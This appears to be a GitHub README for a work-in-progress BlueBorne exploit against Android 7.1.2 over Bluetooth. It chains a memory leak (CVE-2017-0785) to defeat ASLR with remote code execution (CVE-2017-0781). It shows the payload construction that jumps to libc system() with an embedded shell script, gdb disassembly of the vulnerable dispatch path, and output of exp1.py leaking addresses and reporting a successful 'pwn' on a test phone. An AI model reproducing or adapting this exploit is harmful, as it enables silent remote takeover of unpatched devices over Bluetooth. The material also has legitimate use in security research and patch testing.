# android712-blueborne (Work in progress - dirty code)

For testing purposes removed the CVE-2017-0781 pathces and compiled 7.1.2 (LineageOS CM 14.1) on my Samsung S3 Neo+ GT-9301I

Android Blueborne RCE CVE-2017-0781

Tricky to pull off.... not reliable. Since you have to know REMOTE_NAME address, as well as defeat ALSR.

Control r4 register which is REMOTE_NAME

Payload is:
```
SHELL_SCRIPT = b'touch /tmp/test'

Payload is: '"\x17AAAAAAsysm";\n<bash_commands>\n#'
'sysm' is the address of system() from libc. The *whole* payload is a shell script.
0x1700 == (0x1722 & 0xff00) is the "event" of a "HORRIBLE_HACK" message.
payload = struct.pack('<III', 0x41411722, 0x41414141, system_addr) + b'";\n' + SHELL_SCRIPT + b'\n#'
```

After dozen of executions got this condition in

bt_workqueue

```
(gdb) x/30i 0xacda11c4
=> 0xacda11c4:	ldrh	r1, [r4, #0]
   0xacda11c6:	bic.w	r0, r1, #255	; 0xff
   0xacda11ca:	cmp.w	r0, #5632	; 0x1600
   0xacda11ce:	bge.n	0xacda11ec
   0xacda11d0:	cmp.w	r0, #4096	; 0x1000
   0xacda11d4:	beq.n	0xacda1206
   0xacda11d6:	cmp.w	r0, #4352	; 0x1100
   0xacda11da:	beq.n	0xacda1230
   0xacda11dc:	cmp.w	r0, #4608	; 0x1200
   0xacda11e0:	bne.n	0xacda1250
   0xacda11e2:	mov	r0, r4
   0xacda11e4:	ldmia.w	sp!, {r4, lr}
   0xacda11e8:	b.w	0xacd738a4
   0xacda11ec:	beq.n	0xacda123a
   0xacda11ee:	cmp.w	r0, #6400	; 0x1900
   0xacda11f2:	beq.n	0xacda1246
   0xacda11f4:	cmp.w	r0, #5888	; 0x1700
   0xacda11f8:	bne.n	0xacda1250
   0xacda11fa:	ldr	r1, [r4, #8]
   0xacda11fc:	mov	r0, r4
   0xacda11fe:	blx	r1
   0xacda1200:	ldr	r0, [pc, #92]	; (0xacda1260)
   0xacda1202:	add	r0, pc
```

As we can see our system call should be executed on  0xacda11fe


exp1.py

Should defeat ASLR through Data Leak (CVE-2017-0785)

```
s3ve3g:/data/data/com.termux/files/usr/bin # ./gdb                             
GNU gdb (GDB) 8.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "arm-linux-androideabi".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word".
(gdb) attach 898
Attaching to process 898
[New LWP 903]
[New LWP 904]
[New LWP 905]
[New LWP 906]
[New LWP 907]
[New LWP 908]
[New LWP 909]
[New LWP 910]
[New LWP 911]
[New LWP 913]
[New LWP 1005]
[New LWP 1006]
[New LWP 1007]
[New LWP 1008]
[New LWP 1010]
[New LWP 1012]
[New LWP 1015]
[New LWP 1186]
[New LWP 1187]
[New LWP 1195]
[New LWP 1196]
[New LWP 1439]
[New LWP 1442]
[New LWP 1443]
[New LWP 1446]
[New LWP 1448]
[New LWP 1449]
[New LWP 1450]
[New LWP 1452]
[New LWP 1459]
[New LWP 1460]
[New LWP 1462]
[New LWP 1473]
[New LWP 1472]
[New LWP 1474]
[New LWP 1475]
[New LWP 1478]
[New LWP 1479]
[New LWP 1484]
[New LWP 1491]
[New LWP 1492]
[New LWP 8966]
[New LWP 8967]
0xb5503114 in __epoll_pwait () from target:/system/lib/libc.so
(gdb) x/10s 0xacf074ec
0xacf074ec:	"TEST"
0xacf074f1:	""
0xacf074f2:	""
0xacf074f3:	""
0xacf074f4:	""
0xacf074f5:	""
0xacf074f6:	""
0xacf074f7:	""
0xacf074f8:	""
0xacf074f9:	""
(gdb) disass 0xb5500b67
Dump of assembler code for function system:
   0xb5500b4c <+0>:	push	{r4, r5, r6, lr}
   0xb5500b4e <+2>:	sub	sp, #72	; 0x48
   0xb5500b50 <+4>:	ldr	r1, [pc, #236]	; (0xb5500c40 <system+244>)
   0xb5500b52 <+6>:	cmp	r0, #0
   0xb5500b54 <+8>:	ldr	r2, [pc, #236]	; (0xb5500c44 <system+248>)
   0xb5500b56 <+10>:	add	r1, pc
   0xb5500b58 <+12>:	ldr	r1, [r1, #0]
   0xb5500b5a <+14>:	add	r2, pc
   0xb5500b5c <+16>:	vld1.64	{d16-d17}, [r2]
   0xb5500b60 <+20>:	ldr	r1, [r1, #0]
   0xb5500b62 <+22>:	str	r1, [sp, #68]	; 0x44
   0xb5500b64 <+24>:	add	r1, sp, #48	; 0x30
   0xb5500b66 <+26>:	vst1.64	{d16-d17}, [r1]
   0xb5500b6a <+30>:	beq.n	0xb5500bf6 <system+170>
   0xb5500b6c <+32>:	add	r4, sp, #12
   0xb5500b6e <+34>:	str	r0, [sp, #56]	; 0x38
   0xb5500b70 <+36>:	mov	r0, r4
   0xb5500b72 <+38>:	blx	0xb54cea38 <sigemptyset@plt>
   0xb5500b76 <+42>:	mov	r0, r4
   0xb5500b78 <+44>:	movs	r1, #17
   0xb5500b7a <+46>:	blx	0xb54cf11c <sigaddset@plt>
   0xb5500b7e <+50>:	add	r2, sp, #8
---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) b system
Breakpoint 1 at 0xb5500b66
```

Execution:

```
 python exp1.py hci0 84:55:A5:B6:6F:F6 192.168.1.5
Not connected.
[*] Pwn attempt 0:
[*] Set hci0 to new rand BDADDR 72:a0:4f:ff:db:6e
[=====] Doing stack memeory leak...
00: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 
01: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 
02: 00000000 00000000 00000000 acf1740c 9a5102c8 00000018 00000046 acdc3e5d acdd367d 
03: acdcd5e1 acf1740c a7cd7a60 72a04fff 0000db6e 00000000 b4380500 b4380970 51990395 
04: 00000000 9a5102a8 000003f3 00020001 9a510700 09dbb3de 00000008 000f4240 09dbb3de 
05: 00000000 00000000 000f4240 ace4f960 00000000 00000000 000003e8 0011a445 00000000 
06: ace4f960 00007530 00000000 acf15b74 acde736c 00000000 a7ceb2d8 9a510308 00000000 
07: 00000001 acde72f8 9a5102f8 acddc71f 000000a5 00000000 a7ceb2c0 a7ceb2d8 00000000 
08: 00000000 00000484 09d5b340 00000000 00000000 00000000 00000000 00000000 51990395 
09: a7c80000 b4380500 00000003 a7cf1b80 a7c80000 b4380500 b4380a78 aa53c188 a7cf1b80 
10: acf1740c acf15b74 b550fd3b 00000071 aa53c188 b4380500 00000000 aa53c188 b550fd67 
11: acdc40f5 acf00770 00000000 a7cf1b80 00000013 b551fad5 00000071 a7cf1b80 b4380500 
12: b4380970 a7cbae38 00000000 00000001 b550f001 51990395 a7cf1b80 00000046 00000013 
13: 00000000 00000046 a7cf1b80 acf1740c acf15b74 acdc3f91 00000042 a7cf1b90 00000000 
14: acdcd2db a7c8f79c b550fd3b 0000003a aa53c188 b4380500 00000000 aa53c188 b550fd67 
15: 9a5104b0 a7c8f508 0000000f a7cbade0 00000000 b551fad5 0000003a a7cbade0 aa53c188 
16: 00000000 9a5108d8 00000000 9a5104b0 b551fd03 00000000 9a5104b0 51990395 00000008 
17: a7cbae40 51990395 a7c8f070 a7cbade0 9a5108d8 b54d4361 00000001 00000000 a7c8f508 
18: 51990395 9a5108d8 acddf793 51990395 a7c8f510 00000001 a7c8f790 9a5108d8 00000000 
19: 9a5104b0 a7c8f508 a7c8f79c acddef85 00000001 0000003d a7c8f790 00000000 00000001 
[*] LIBC  0xb54d4361
[*] BT    0xacdd367d
[*] libc_base: 0xb542c000, bss_base: 0xacd54000
[*] system: 0xb5500b67, acl_name: 0xacf074ec
[*] Set hci0 to new rand BDADDR 85:1d:5a:82:9c:0c
[*] system    0xb5500b67
[*] PAYLOAD "\x17AAAAAAg\x0bP\xb5";
    touch /system/tmp/test
    #
[+] Connecting to BNEP again: Done
[+] Pwning...: Done
```
